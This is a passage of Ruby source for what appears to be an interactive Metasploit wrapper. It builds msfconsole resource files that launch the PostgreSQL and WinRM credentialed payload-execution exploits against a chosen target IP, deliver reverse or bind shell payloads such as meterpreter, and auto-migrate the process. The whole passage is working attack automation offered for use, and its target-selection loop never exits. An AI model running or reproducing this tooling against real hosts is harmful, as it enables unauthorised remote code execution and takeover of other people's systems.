		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Provide PostgreSQL Port: ")
			zPORT=gets.chomp
		else
			zPORT='5432'
		end
		while(true)
			print_caution("Select Target Type: ")
			print_caution("1) Linux x86")
			print_caution("2) Linux x86_64")
			answer=gets.chomp
			if answer == '1'
				zTARGET='0'
			elsif answer == '2'
				zTARGET='1'
			end
		end
		print_status("Please remember to choose a Linux Payload.....")
		payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		if payload =~ /bind/
			print_caution("Please provide PORT for Bind Shell: ")
		else
			print_caution("Please provide PORT to listen on: ")
		end
		zport=gets.chomp

		print_status("Launching PostgreSQL Linux Credentialed Payload Execution against #{zIP}:#{zPORT} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use exploit/linux/postgres/postgres_payload"
		f.puts "set RHOST #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set USERNAME #{sqlUser}"
		f.puts "set PASSWORD #{sqlPass}"
		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zport}"
		f.puts "set ExitOnSession false"
		if payload =~ /meterpreter/
			f.puts "set AutoRunScript migrate -f"
		end
		f.puts "exploit -j -z"
		f.close

		pgsql_sploit="xterm -title 'PostgreSQL Linux Credentialed Payload Execution' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(pgsql_sploit)
		print_line("")
	end

	# WinRM Payload Exec
	# This module uses valid credentials to login to the WinRM service and execute a payload. 
	# It has two available methods for payload delivery: Powershell 2.0 and VBS CmdStager. 
	# The module will check if Powershell 2.0 is available, and if so uses that method. 
	# Otherwise it falls back to the VBS Cmdstager which is less stealthy. 
	# IMPORTANT: If targeting an x64 system with the Powershell method you 
	# MUST select an x64 payload. An x86 payload will never return.
	def winrm_cmd_exec
		print_status("")
		print_status("WinRM Payload Exec")
		print_status("")
		print_caution("Target IP: ")
		zIP=gets.chomp

		print_caution("Use Standard WinRM HTTP API Port of 5985 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Port: ")
			zPORT=gets.chomp
		else
			zPORT='5985'
		end
		print_caution("Use standard URI /wsman (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("URI to use: ")
			zURI=gets.chomp
		else
			zURI='/wsman'
		end
		print_caution("Set Domain (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			print_caution("Domain to use: ")
			zDOMAIN=gets.chomp
		else
			zDOMAIN='WORKSTATION'
		end
		print_caution("Please provide Username: ")
		pgUser=gets.chomp

		print_caution("Please provide Password: ")
		pgPass=gets.chomp

		print_status("Payload Selection")
		print_caution("NOTE: remember to choose a Windows Payload!")
		print_error("NOTE: x64 Payload required for x64 targets or it will hang!")
		payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		if payload =~ /bind/
			print_caution("Please provide PORT for Bind Shell: ")
		else
			print_caution("Please provide PORT to listen on: ")
		end
		zLPORT=gets.chomp

		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use exploit/windows/winrm/winrm_script_exec"
		f.puts "set USERNAME #{pgUser}"
		f.puts "set PASSWORD #{pgPass}"
		f.puts "set RHOST #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set DOMAIN #{zDOMAIN}"
		f.puts "set URI #{zURI}"
		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zLPORT}"
		f.puts "set ExitOnSession false"
		if payload =~ /meterpreter/
			f.puts "set AutoRunScript migrate -f"
		end
		f.puts "exploit -j -z"
		f.close
		print_status("Launching WinRM Payload Exec against #{zIP}:#{zPORT} in a new x-window.....")
		winrm_exec="xterm -title 'WinRM Payload Exec' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(winrm_exec)
		print_line("")
	end
end
